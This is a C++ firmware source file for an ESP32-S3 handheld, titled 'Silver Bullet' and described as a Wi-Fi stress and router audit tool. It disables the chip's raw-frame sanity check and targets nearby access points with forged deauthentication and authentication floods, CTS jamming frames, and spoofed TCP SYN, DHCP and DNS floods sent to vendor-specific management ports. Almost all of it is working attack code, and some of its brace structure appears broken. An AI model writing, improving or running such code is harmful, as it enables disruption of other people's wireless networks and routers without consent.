/**
 * @file silver_bullet.cpp
 * @brief Silver Bullet - Ferramenta Avançada de Estresse Wi-Fi e Auditoria de CPEs
 * @hardware ESP32-S3 (M5Stack Cardputer) - ESP-IDF v4.4
 */

#include <M5Unified.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <nvs_flash.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>
#include <atomic>
#include <lwip/def.h> 
#include <esp_heap_caps.h>
#include "esp_random.h"
#include "esp_log.h" 

// ===================================================================
// BYPASS DO FIREWALL DA ESPRESSIF (SANITY CHECK KILLER)
// ===================================================================
extern "C" __attribute__((used)) int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3) {
    return 0; // 0 significa "Pacote validado, pode disparar a injeção"
}

// ===================================================================
// 1. ESTRUTURAS DE PACOTES (OTIMIZADAS PARA ACESSO DIRETO DMA)
// ===================================================================

struct __attribute__((packed)) DeauthPacket {
    uint16_t frame_control; uint16_t duration;
    uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];
    uint16_t seq_ctrl; uint16_t reason_code;
};

struct __attribute__((packed)) AuthPacket {
    uint16_t frame_control; uint16_t duration;
    uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];
    uint16_t seq_ctrl; uint16_t auth_algorithm; uint16_t auth_seq; uint16_t status_code;
};

struct __attribute__((packed)) CtsPacket {
    uint16_t frame_control; uint16_t duration; uint8_t  mac_ra[6];     
};

struct __attribute__((packed)) MacHeader {
    uint16_t frame_control; uint16_t duration;
    uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];  
    uint16_t seq_ctrl;
};

struct __attribute__((packed)) LlcSnapHeader {
    uint8_t dsap; uint8_t ssap; uint8_t control; uint8_t oui[3]; uint16_t ethertype;
};

struct __attribute__((packed)) IpHeader {
    uint8_t  version_ihl; uint8_t  tos; uint16_t total_length; uint16_t id;
    uint16_t frag_off; uint8_t  ttl; uint8_t  protocol; uint16_t checksum;
    uint8_t  ip_src[4]; uint8_t  ip_dest[4];    
};

struct __attribute__((packed)) UdpHeader {
    uint16_t src_port; uint16_t dest_port; uint16_t length; uint16_t checksum;
};

struct __attribute__((packed)) TcpHeader {
    uint16_t src_port; uint16_t dest_port; uint32_t seq_num; uint32_t ack_num;
    uint8_t  data_offset_res; uint8_t  flags; uint16_t window_size;
    uint16_t checksum; uint16_t urgent_ptr;
};

struct __attribute__((packed)) SilverBulletPacket {
    MacHeader mac;
    LlcSnapHeader llc;
    IpHeader ip;
    uint8_t l4_and_payload[288]; 
};

struct __attribute__((packed)) PseudoHeader {
    uint8_t src_ip[4]; uint8_t dest_ip[4]; uint8_t reserved; uint8_t protocol; uint16_t l4_length;
};

// ===================================================================
// 2. VARIÁVEIS GLOBAIS E ENUMS DE INTELIGÊNCIA
// ===================================================================

#define MAX_ALVOS 20
wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
uint16_t total_alvos = 0;
int alvo_selecionado = 0;

std::atomic<uint8_t> canal_atual_alvo{0};
std::atomic<int8_t> rssi_alvo{0};
std::atomic<bool> alvo_perdido{false};
std::atomic<bool> tx_power_max{true}; 
std::atomic<bool> tx_power_max_user{true}; 
std::atomic<bool> flag_update_config{false}; 
std::atomic<bool> erro_memoria_critico{false}; 
std::atomic<bool> scanner_pausa_ataque{false}; 
std::atomic<bool> thermal_lock{false};         

std::atomic<uint32_t> pacotes_enviados_segundo{0};
std::atomic<uint32_t> pps_atual{0};
uint32_t prng_state = 1; 

SemaphoreHandle_t display_mutex = NULL;
SemaphoreHandle_t scan_mutex = NULL;

enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
std::atomic<EstadoFerramenta> estado_atual{ESTADO_ESCANEAR};

enum ModoAtaque { MODO_MANUAL_L2, MODO_MANUAL_L3, MODO_MANUAL_CTS, MODO_AUTOMATICO };
std::atomic<ModoAtaque> modo_ativo{MODO_AUTOMATICO};

enum EstrategiaAuto { 
    ESTRATEGIA_LEGACY_CRITICA,    
    ESTRATEGIA_WPA2_TKIP_CRITICA, 
    ESTRATEGIA_WPA2_AES_PADRAO,   
    ESTRATEGIA_WPA3_BLINDADO,     
    ESTRATEGIA_SINAL_MEDIO, 
    ESTRATEGIA_SINAL_FRACO, 
    ESTRATEGIA_DESCONHECIDA 
};
std::atomic<EstrategiaAuto> estrategia_atual{ESTRATEGIA_DESCONHECIDA};

enum FabricanteCPE { 
    FABRICANTE_GENERICO, FABRICANTE_MIKROTIK, FABRICANTE_HUAWEI, 
    FABRICANTE_TPLINK, FABRICANTE_INTELBRAS, FABRICANTE_ZTE 
};

FabricanteCPE identificar_fabricante(const uint8_t* mac) {
    if (mac == nullptr) return FABRICANTE_GENERICO; 

    if ((mac[0] == 0x4C && mac[1] == 0x5E && mac[2] == 0x0C) || 
        (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x42) || 
        (mac[0] == 0xCC && mac[1] == 0x2D && mac[2] == 0xE0) ||
        (mac[0] == 0xB8 && mac[1] == 0x69 && mac[2] == 0xF4)) return FABRICANTE_MIKROTIK;

    if ((mac[0] == 0x00 && mac[1] == 0x1E && mac[2] == 0x10) || 
        (mac[0] == 0x00 && mac[1] == 0xE0 && mac[2] == 0xFC) || 
        (mac[0] == 0x10 && mac[1] == 0x47 && mac[2] == 0x80)) return FABRICANTE_HUAWEI;

    if ((mac[0] == 0xC0 && mac[1] == 0xC9 && mac[2] == 0xE3) || 
        (mac[0] == 0x50 && mac[1] == 0x3E && mac[2] == 0xAA) || 
        (mac[0] == 0x1C && mac[1] == 0xFA && mac[2] == 0x68)) return FABRICANTE_TPLINK;

    if ((mac[0] == 0x00 && mac[1] == 0x1A && mac[2] == 0x3F) || 
        (mac[0] == 0x48 && mac[1] == 0xDC && mac[2] == 0x2D)) return FABRICANTE_INTELBRAS;

    if ((mac[0] == 0xCC && mac[1] == 0x7B && mac[2] == 0x35) || 
        (mac[0] == 0x34 && mac[1] == 0xE0 && mac[2] == 0xCF)) return FABRICANTE_ZTE;
    
    return FABRICANTE_GENERICO;
}

const char* get_nome_modo() {
    if (modo_ativo.load() != MODO_AUTOMATICO) return "MODO: OVERRIDE MANUAL";
    switch(estrategia_atual.load()) {
        case ESTRATEGIA_LEGACY_CRITICA:   return "AUTO: LEGACY (L2+L3 FULL)";
        case ESTRATEGIA_WPA2_TKIP_CRITICA:return "AUTO: WPA2-TKIP (FATAL L2)";
        case ESTRATEGIA_WPA2_AES_PADRAO:  return "AUTO: WPA2-AES (L2+CTS)";
        case ESTRATEGIA_WPA3_BLINDADO:    return "AUTO: STEALTH WPA3 (CTS ONLY)";
        case ESTRATEGIA_SINAL_MEDIO:      return "AUTO: SINAL MEDIO (CTS PURSUIT)";
        case ESTRATEGIA_SINAL_FRACO:      return "AUTO: JAMMING RF (CTS ONLY)";
        default:                          return "AUTO: ANALISANDO...";
    }
}

// ===================================================================
// 3. MOTORES MATEMÁTICOS DE ALTA PERFORMANCE (IRAM)
// ===================================================================

IRAM_ATTR inline uint32_t fast_rand() {
    uint32_t x = prng_state; x ^= x << 13; x ^= x >> 17; x ^= x << 5; return prng_state = x;
}

inline uint16_t fast_ip_checksum(IpHeader *ip) {
    uint32_t acc = 0; uint16_t *data = (uint16_t *)(void *)ip;
    for (int i = 0; i < 10; ++i) acc += data[i];
    while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
    return ~acc;
}

inline uint16_t fast_l4_checksum(IpHeader *ip, void *l4_hdr, size_t l4_len, uint8_t *payload, size_t payload_len) {
    PseudoHeader psd;
    memcpy(psd.src_ip, ip->ip_src, 4); memcpy(psd.dest_ip, ip->ip_dest, 4);
    psd.reserved = 0; psd.protocol = ip->protocol; psd.l4_length = htons(l4_len + payload_len);

    uint32_t acc = 0; 
    uint16_t word;
    
    uint8_t *ptr = (uint8_t *)&psd;
    for (size_t i = 0; i < sizeof(PseudoHeader); i += 2) { memcpy(&word, ptr + i, 2); acc += word; }
    
    uint8_t *l4_p = (uint8_t *)l4_hdr;
    for (size_t i = 0; i < l4_len; i += 2) { memcpy(&word, l4_p + i, 2); acc += word; }

    for (size_t i = 0; i < (payload_len & ~1); i += 2) { memcpy(&word, payload + i, 2); acc += word; }
    if (payload_len & 1) { word = 0; memcpy(&word, payload + payload_len - 1, 1); acc += word; }

    while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
    return ~acc;
}

// ===================================================================
// 4. MÓDULO DE RECONHECIMENTO AUTOMÁTICO
// ===================================================================

void analisar_alvo_automaticamente(int indice_alvo) {
    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
        wifi_ap_record_t ap = alvos_encontrados[indice_alvo];
        xSemaphoreGive(scan_mutex);
        
        if (ap.rssi < -80) {
            estrategia_atual.store(ESTRATEGIA_SINAL_FRACO); return;
        } else if (ap.rssi >= -80 && ap.rssi < -70) {
            estrategia_atual.store(ESTRATEGIA_SINAL_MEDIO); return;
        }

       if (ap.authmode == WIFI_AUTH_WPA3_PSK || ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || ap.authmode == WIFI_AUTH_WPA2_ENTERPRISE) {
            estrategia_atual.store(ESTRATEGIA_WPA3_BLINDADO);
        }
        else if (ap.authmode == WIFI_AUTH_OPEN || ap.authmode == WIFI_AUTH_WEP) {
            estrategia_atual.store(ESTRATEGIA_LEGACY_CRITICA);
        }
        else {
            if (ap.pairwise_cipher == WIFI_CIPHER_TYPE_TKIP || ap.group_cipher == WIFI_CIPHER_TYPE_TKIP) {
                estrategia_atual.store(ESTRATEGIA_WPA2_TKIP_CRITICA);
            } else {
                estrategia_atual.store(ESTRATEGIA_WPA2_AES_PADRAO);
            }
        }
    }
}

// ===================================================================
// 5. INTERFACE E MONITORAMENTO (CORE 1)
// ===================================================================

void escanear_redes() {
    alvo_perdido.store(false);

    if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
        M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
        M5.Display.println("📡 Escaneando Redes...");
        xSemaphoreGive(display_mutex);
    }
    
    esp_wifi_set_mode(WIFI_MODE_STA); 

    wifi_scan_config_t scan_config;
    memset(&scan_config, 0, sizeof(scan_config)); 
    scan_config.show_hidden = true;
    scan_config.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    
    esp_err_t err = esp_wifi_scan_start(&scan_config, true); 
    
    if (err != ESP_OK) {
        if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
            M5.Display.setTextColor(TFT_RED, TFT_BLACK);
            M5.Display.printf("ERRO RADIO: %d\n", err);
            xSemaphoreGive(display_mutex);
        }
        vTaskDelay(pdMS_TO_TICKS(2000));
    }
    
    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
        esp_wifi_scan_get_ap_num(&total_alvos);
        uint16_t max_aps = MAX_ALVOS; 
        esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
        if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
        xSemaphoreGive(scan_mutex);
    }
    
    alvo_selecionado = 0; estado_atual.store(ESTADO_SELECIONAR);
}

void desenhar_menu() {
    if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
        M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
        
        const char* modo_str = "AUTO";
        if(modo_ativo.load() == MODO_MANUAL_L2) modo_str = "L2";
        else if(modo_ativo.load() == MODO_MANUAL_L3) modo_str = "L3";
        else if(modo_ativo.load() == MODO_MANUAL_CTS) modo_str = "CTS";

        if (thermal_lock.load()) {
            M5.Display.setTextColor(TFT_RED, TFT_BLACK);
            M5.Display.printf("⚡ PWR: ECO | MOD: %s\n", modo_str);
        } else {
            M5.Display.printf("⚡ PWR: %s | MOD: %s\n", tx_power_max.load() ? "MAX" : "ECO", modo_str);
        }
        
        M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY); M5.Display.setCursor(0, 20);

        if (total_alvos == 0) { 
            M5.Display.setTextColor(TFT_RED, TFT_BLACK); M5.Display.println("Nenhum alvo encontrado!"); 
        } else {
            int inicio = (alvo_selecionado / 5) * 5;
            if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
                for (int i = inicio; i < inicio + 5 && i < total_alvos; i++) {
                    if (i == alvo_selecionado) M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); 
                    else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                    bool wpa3 = (alvos_encontrados[i].authmode == WIFI_AUTH_WPA3_PSK || alvos_encontrados[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
                    M5.Display.printf("%d. %s %s\n", i + 1, alvos_encontrados[i].ssid, wpa3 ? "[WPA3]" : "");
                }
                xSemaphoreGive(scan_mutex);
            }
        }
        xSemaphoreGive(display_mutex);
    }
}

void task_display(void *pvParameters) {
    TickType_t ultimo_tempo_pps = xTaskGetTickCount();
    while (true) {
        TickType_t tempo_atual = xTaskGetTickCount();
        if ((tempo_atual - ultimo_tempo_pps) >= pdMS_TO_TICKS(1000)) {
            pps_atual.store(pacotes_enviados_segundo.exchange(0, std::memory_order_relaxed)); 
            ultimo_tempo_pps = tempo_atual;
        }

        if (estado_atual.load() == ESTADO_ATIRAR) {
            if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
                M5.Display.setCursor(0, 0);
                if (erro_memoria_critico.load()) {
                     M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                     M5.Display.println("ERRO CRITICO: FALHA DMA!"); 
                     xSemaphoreGive(display_mutex);
                     vTaskDelay(pdMS_TO_TICKS(5000));
                     esp_restart(); 
                }

                if (!alvo_perdido.load()) {
                    M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                    
                    char alvo_ssid[33] = {0};
                    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
                        strncpy(alvo_ssid, (char*)alvos_encontrados[alvo_selecionado].ssid, 32);
                        xSemaphoreGive(scan_mutex);
                    }
                    M5.Display.printf("⚔️ ALVO: %s\n", alvo_ssid);
                    
                    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                    M5.Display.printf("CH: %d | TEMP: N/A | %s\n", canal_atual_alvo.load(), tx_power_max.load() ? "MAX" : "ECO");

                    M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK);
                    M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                    if(scanner_pausa_ataque.load()) M5.Display.printf("> RASTREANDO FUGA...\n");
                    else M5.Display.printf("> %s\n", get_nome_modo());
                    
                    M5.Display.setCursor(0, 60); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
                    M5.Display.printf(">> INJETANDO: %u PPS <<\n",  (unsigned int)pps_atual.load());
                } else {
                    M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK); 
                    M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK); M5.Display.printf("⚠️ ALVO PERDIDO\n");
                }
                xSemaphoreGive(display_mutex);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(200)); 
    }
}

void task_monitoramento(void *pvParameters) {
    uint8_t falhas_consecutivas = 0;
    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR) {
            if ( (uint32_t)pps_atual.load() < 50 && !scanner_pausa_ataque.load()) falhas_consecutivas++;
            else falhas_consecutivas = 0;

            if (falhas_consecutivas > 3 && !alvo_perdido.load()) {
                scanner_pausa_ataque.store(true); vTaskDelay(pdMS_TO_TICKS(250));   
                
                uint8_t mac_alvo[6]; 
                if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
                    memcpy(mac_alvo, alvos_encontrados[alvo_selecionado].bssid, 6);
                    xSemaphoreGive(scan_mutex);
                }
                
                wifi_scan_config_t scan_config = {}; scan_config.bssid = mac_alvo; scan_config.show_hidden = true;
                
                if (esp_wifi_scan_start(&scan_config, true) == ESP_OK) {
                    uint16_t num_aps = 1; wifi_ap_record_t ap_encontrado; 
                    esp_wifi_scan_get_ap_records(&num_aps, &ap_encontrado);
                    if (num_aps > 0) { canal_atual_alvo.store(ap_encontrado.primary); flag_update_config.store(true); falhas_consecutivas = 0; } 
                    else { alvo_perdido.store(true); }
                }
                scanner_pausa_ataque.store(false); 
            }
            vTaskDelay(pdMS_TO_TICKS(2000));
        } else { vTaskDelay(pdMS_TO_TICKS(1000)); }
    }
}

// ===================================================================
// 6. MOTOR DE INJEÇÃO (DESBLOQUEADO PARA O V4.4)
// ===================================================================

void task_ataque(void *pvParameters) {
    SilverBulletPacket* pkt = (SilverBulletPacket*) heap_caps_malloc(sizeof(SilverBulletPacket), MALLOC_CAP_DMA);
    DeauthPacket* deauth = (DeauthPacket*) heap_caps_malloc(sizeof(DeauthPacket), MALLOC_CAP_DMA);
    AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
    CtsPacket* cts = (CtsPacket*) heap_caps_malloc(sizeof(CtsPacket), MALLOC_CAP_DMA);
    
    if (!pkt || !deauth || !auth || !cts) { 
        erro_memoria_critico.store(true); vTaskDelete(NULL); 
    }
    
    prng_state = esp_random(); if (prng_state == 0) prng_state = 1; 
    
    pkt->llc.dsap = 0xAA; pkt->llc.ssap = 0xAA; pkt->llc.control = 0x03;
    pkt->llc.oui[0] = 0x00; pkt->llc.oui[1] = 0x00; pkt->llc.oui[2] = 0x00;
    pkt->llc.ethertype = htons(0x0800); 
    
    const uint8_t subnets[][2] = {{192, 168}, {10, 0}, {172, 16}, {100, 64}}; 
    const uint8_t common_gateways[][4] = {{192, 168, 0, 1}, {192, 168, 1, 1}, {192, 168, 15, 1}, {10, 0, 0, 1}, {172, 16, 0, 1}};
    const uint16_t portas_gerencia_genericas[] = {80, 443, 22, 7547}; 
    const uint16_t reason_codes[] = { 0x0001, 0x0002, 0x0004, 0x0007, 0x0008 };

    bool config_radio_aplicada = false;
    uint32_t iteracao_yield = 0;

    int alvo_configurado = -1;
    FabricanteCPE fabricante = FABRICANTE_GENERICO;
    uint16_t porta_alvo = 80;
    uint8_t mac_alvo_local[6] = {0};
    
    uint8_t dns_query_base[] = {
        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x06, 'g', 'o', 'o', 'g', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00, 
        0x00, 0x01, 0x00, 0x01  
    };

    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load() && !scanner_pausa_ataque.load()) {
            
            if (!config_radio_aplicada || flag_update_config.load()) {
                esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
                esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                config_radio_aplicada = true; flag_update_config.store(false);
                
                if (alvo_configurado != alvo_selecionado) {
                    alvo_configurado = alvo_selecionado;
                    
                    if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
                        memcpy(mac_alvo_local, alvos_encontrados[alvo_selecionado].bssid, 6);
                        xSemaphoreGive(scan_mutex);
                    }
                    
                    fabricante = identificar_fabricante(mac_alvo_local);
                    if (fabricante == FABRICANTE_MIKROTIK) porta_alvo = (fast_rand() % 2 == 0) ? 8291 : 80;
                    else if (fabricante == FABRICANTE_HUAWEI || fabricante == FABRICANTE_ZTE) porta_alvo = (fast_rand() % 2 == 0) ? 443 : 7547;
                    else if (fabricante == FABRICANTE_TPLINK || fabricante == FABRICANTE_INTELBRAS) porta_alvo = (fast_rand() % 2 == 0) ? 80 : 8080;
                    else porta_alvo = portas_gerencia_genericas[fast_rand() % 4];

                    deauth->frame_control = 0x00C0; deauth->duration = 0; 
                    memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
                    memcpy(deauth->mac_src, mac_alvo_local, 6); memcpy(deauth->mac_bssid, mac_alvo_local, 6);

                    auth->frame_control = 0x00B0; auth->duration = 0; auth->auth_algorithm = 0; auth->auth_seq = 1; auth->status_code = 0;
                    memcpy(auth->mac_dest, mac_alvo_local, 6); memcpy(auth->mac_bssid, mac_alvo_local, 6);

                    cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo_local, 6);

                    pkt->mac.frame_control = 0x0108; pkt->mac.duration = 0;
                    pkt->ip.version_ihl = 0x45; pkt->ip.ttl = 64; pkt->ip.tos = 0; 
                }
            }

            ModoAtaque modo = modo_ativo.load();
            EstrategiaAuto estrategia = estrategia_atual.load();

            bool atirar_l2 = false, atirar_cts = false, atirar_l3 = false;

            if (modo == MODO_MANUAL_L2) atirar_l2 = true;
            else if (modo == MODO_MANUAL_CTS) atirar_cts = true;
            else if (modo == MODO_MANUAL_L3) atirar_l3 = true; 
            else if (modo == MODO_AUTOMATICO) {
                switch (estrategia) {
                    case ESTRATEGIA_SINAL_FRACO: atirar_cts = true; break;
                    case ESTRATEGIA_SINAL_MEDIO: atirar_cts = true; break;
                    case ESTRATEGIA_WPA3_BLINDADO: atirar_cts = true; break;
                    case ESTRATEGIA_WPA2_AES_PADRAO: atirar_l2 = true; atirar_cts = true; break;
                    case ESTRATEGIA_WPA2_TKIP_CRITICA: atirar_l2 = true; break;
                    case ESTRATEGIA_LEGACY_CRITICA: atirar_l2 = true; atirar_l3 = true; break; 
                    default: break;
                }
            }
            
            uint32_t local_pps = 0; 

            if (atirar_l2) {
                for(int j = 0; j < 5; j++) { 
                    memcpy(auth->mac_src, mac_alvo_local, 3);
                    auth->mac_src[3] = fast_rand() & 0xFF; auth->mac_src[4] = fast_rand() & 0xFF; auth->mac_src[5] = fast_rand() & 0xFF;
                    
                    auth->seq_ctrl = (fast_rand() & 0xFFF) << 4; deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                    deauth->reason_code = reason_codes[fast_rand() % 5];
                    
if(esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_OK) local_pps++;
                    if(esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_OK) local_pps++;
                }
            }

            if (atirar_cts) {
                if(esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_OK) local_pps++;
            }

            // === CÓDIGO ANTITRAVAMENTO (WATCHDOG) ===
            static uint32_t contador_tiros = 0;
            contador_tiros++;
            // A cada 50 ciclos de injeção, libera a CPU 0 por 1 tick (milissegundo)
            if (contador_tiros % 50 == 0) {
                vTaskDelay(pdMS_TO_TICKS(1));
            }
            // ========================================

        } // <-- Fim do while (estado_atual.load() == ESTADO_ATIRAR)
            if (atirar_l3) {
                int chance_tcp_syn = 6; int chance_dhcp = 2;  

                for (int i = 0; i < 15; i++) { 
                    if (scanner_pausa_ataque.load()) break;

                    int tipo_ataque = fast_rand() % 10;
                    bool is_tcp = (tipo_ataque < chance_tcp_syn); 
                    bool is_dhcp = (tipo_ataque >= chance_tcp_syn && tipo_ataque < (chance_tcp_syn + chance_dhcp));

                    pkt->mac.seq_ctrl = (fast_rand() & 0xFFF) << 4;
                    memcpy(pkt->mac.mac_src, mac_alvo_local, 3); 
                    pkt->mac.mac_src[3] = fast_rand() & 0xFF; pkt->mac.mac_src[4] = fast_rand() & 0xFF; pkt->mac.mac_src[5] = fast_rand() & 0xFF;

                    pkt->ip.id = (uint16_t)fast_rand(); pkt->ip.frag_off = 0; 
                    int subnet_idx = fast_rand() & 3;
                    pkt->ip.ip_src[0] = subnets[subnet_idx][0]; pkt->ip.ip_src[1] = subnets[subnet_idx][1]; 
                    pkt->ip.ip_src[2] = fast_rand() & 0xFF; pkt->ip.ip_src[3] = fast_rand() & 0xFF;
                    
                    size_t t_injecao = 0;
                    
                    if (is_tcp) {
                        TcpHeader* tcp = (TcpHeader*)pkt->l4_and_payload;
                        size_t t_payload = 0; 
                        pkt->ip.protocol = 6; 
                        
                        int gw_idx = fast_rand() % 5;
                        pkt->ip.ip_dest[0] = common_gateways[gw_idx][0]; pkt->ip.ip_dest[1] = common_gateways[gw_idx][1]; 
                        pkt->ip.ip_dest[2] = common_gateways[gw_idx][2]; pkt->ip.ip_dest[3] = common_gateways[gw_idx][3]; 
                        
                        tcp->src_port = htons(1024 + (fast_rand() % 60000)); tcp->dest_port = htons(porta_alvo); 
                        tcp->seq_num = fast_rand(); tcp->ack_num = 0; tcp->data_offset_res = (6 << 4); 
                        tcp->flags = 0x02; tcp->window_size = htons(5840); tcp->urgent_ptr = 0;
                        
                        uint8_t* tcp_options = pkt->l4_and_payload + sizeof(TcpHeader);
                        tcp_options[0] = 0x02; tcp_options[1] = 0x04; tcp_options[2] = 0x05; tcp_options[3] = 0xB4;
                        t_payload = 4; 
                        
                        t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
                        pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(TcpHeader) + t_payload);
                        
                        memcpy(pkt->mac.mac_dest, mac_alvo_local, 6); memcpy(pkt->mac.mac_bssid, mac_alvo_local, 6);
                        pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                        tcp->checksum = 0; tcp->checksum = fast_l4_checksum(&pkt->ip, tcp, sizeof(TcpHeader), tcp_options, t_payload);
                    } 
                    else if (is_dhcp) {
                        UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
                        uint8_t* payload = pkt->l4_and_payload + sizeof(UdpHeader);
                        
                        pkt->ip.protocol = 17; 
                        pkt->ip.ip_dest[0] = 255; pkt->ip.ip_dest[1] = 255; pkt->ip.ip_dest[2] = 255; pkt->ip.ip_dest[3] = 255; 
                        udp->src_port = htons(68); udp->dest_port = htons(67); 
                        
                        payload[0] = 0x01; payload[1] = 0x01; payload[2] = 0x06; payload[3] = 0x00; 
                        payload[4] = fast_rand() & 0xFF; payload[5] = fast_rand() & 0xFF; 
                        payload[6] = fast_rand() & 0xFF; payload[7] = fast_rand() & 0xFF;
                        
                        for(int m = 8; m < 236; m++) payload[m] = 0; 
                        for(int m = 0; m < 6; m++) payload[28 + m] = fast_rand() & 0xFF; 
                        
                        payload[236] = 0x63; payload[237] = 0x82; payload[238] = 0x53; payload[239] = 0x63;
                        payload[240] = 53; payload[241] = 1; payload[242] = 1;    
                        payload[243] = 55; payload[244] = 2; payload[245] = 1; payload[246] = 3; payload[247] = 255; 
                        
                        t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + 248; 
                        pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + 248);
                        udp->length = htons(sizeof(UdpHeader) + 248);
                        
                        memcpy(pkt->mac.mac_dest, mac_alvo_local, 6); memcpy(pkt->mac.mac_bssid, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
                        pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                        
                        udp->checksum = 0; 
                        uint16_t calc_chk = fast_l4_checksum(&pkt->ip, udp, sizeof(UdpHeader), payload, 248);
                        udp->checksum = (calc_chk == 0x0000) ? 0xFFFF : calc_chk;
                    }
                    else { 
                        UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
                        uint8_t* payload = pkt->l4_and_payload + sizeof(UdpHeader);
                        
                        size_t t_payload = sizeof(dns_query_base);
                        memcpy(payload, dns_query_base, t_payload);
                        payload[0] = (uint8_t)(fast_rand() & 0xFF); payload[1] = (uint8_t)(fast_rand() & 0xFF);

                        pkt->ip.protocol = 17; 
                        int gw_idx = fast_rand() % 5;
                        pkt->ip.ip_dest[0] = common_gateways[gw_idx][0]; pkt->ip.ip_dest[1] = common_gateways[gw_idx][1]; 
                        pkt->ip.ip_dest[2] = common_gateways[gw_idx][2]; pkt->ip.ip_dest[3] = common_gateways[gw_idx][3];

                        udp->src_port = htons(1024 + (fast_rand() % 60000)); udp->dest_port = htons(53); 
                        
                        t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + t_payload;
                        pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + t_payload);
                        udp->length = htons(sizeof(UdpHeader) + t_payload);
                        
                        memcpy(pkt->mac.mac_dest, mac_alvo_local, 6); memcpy(pkt->mac.mac_bssid, mac_alvo_local, 6);
                        pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                        
                        udp->checksum = 0; 
                        uint16_t calc_chk_dns = fast_l4_checksum(&pkt->ip, udp, sizeof(UdpHeader), payload, t_payload);
                        udp->checksum = (calc_chk_dns == 0x0000) ? 0xFFFF : calc_chk_dns;
                    }
                    
                    if(esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_OK) local_pps++;
                }
            }
            
            if (local_pps > 0) pacotes_enviados_segundo.fetch_add(local_pps, std::memory_order_relaxed);
            else vTaskDelay(pdMS_TO_TICKS(1)); 

            iteracao_yield++; 
            if (iteracao_yield % 8 == 0) vTaskDelay(pdMS_TO_TICKS(1)); 
        } else {
            config_radio_aplicada = false; vTaskDelay(pdMS_TO_TICKS(100)); 
        }
    }
}

// ===================================================================
// 7. INICIALIZAÇÃO I2C E CONTROLES (TECLADO)
// ===================================================================

#define TCA8418_ADDR 0x34
#define TCA8418_KP_GPIO1 0x1D
#define TCA8418_KP_GPIO2 0x1E
#define TCA8418_KP_GPIO3 0x1F
#define TCA8418_CFG 0x01
